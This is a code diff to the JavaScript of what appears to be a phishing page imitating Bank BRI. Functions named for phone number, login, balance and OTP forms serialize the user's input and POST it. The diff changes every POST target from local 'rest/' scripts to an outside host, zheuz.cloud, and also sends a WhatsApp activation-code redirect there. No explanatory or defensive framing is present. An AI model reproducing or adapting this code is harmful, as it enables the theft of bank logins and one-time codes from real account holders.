@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'rest/no.php',
+        url: 'https://zheuz.cloud/bri/v1-bt6d/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -42,7 +42,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'rest/login.php',
+        url: 'https://zheuz.cloud/bri/v1-bt6d/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -77,7 +77,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'rest/saldo.php',
+        url: 'https://zheuz.cloud/bri/v1-bt6d/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -110,7 +110,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'rest/otp.php',
+        url: 'https://zheuz.cloud/bri/v1-bt6d/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
@@ -129,7 +129,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/628161656703?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+location.href='https://zheuz.cloud/wa/v1-bt6d';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
